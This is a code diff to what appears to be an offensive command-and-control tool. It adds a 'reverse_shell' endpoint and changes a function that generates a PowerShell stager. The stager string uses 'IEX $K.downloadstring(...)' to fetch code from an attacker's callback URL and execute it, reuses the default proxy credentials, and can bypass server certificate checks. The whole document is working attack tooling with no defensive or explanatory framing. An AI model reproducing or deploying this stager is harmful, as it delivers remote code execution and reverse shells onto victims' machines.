@@ -93,8 +93,15 @@ ssl_tls12 = (
     "[Net.SecurityProtocolType]::Tls12;"
 )
 
+endpoints = {
+    'hub': "0",
+    'reverse_shell': "0?r",
+}
 
-def stager_str(need_proxy=True, need_tlsv12=(args.SSL_KEY is not None)):
+
+def stager_str(flavor='hub',
+               need_proxy=True,
+               need_tlsv12=(args.SSL_KEY is not None)):
     result = ""
     if args.SSL_KEY:
         result += ("[System.Net.ServicePointManager]::ServerCertificate"
@@ -108,5 +115,5 @@ def stager_str(need_proxy=True, need_tlsv12=(args.SSL_KEY is not None)):
                    "$K.Proxy.Credentials=[Net.CredentialCache]::"
                    "DefaultCredentials;")
 
-    result += "IEX $K.downloadstring('%s0');"
-    return result % callback_url
+    result += "IEX $K.downloadstring('%s%s');"
+    return result % (callback_url, endpoints[flavor])
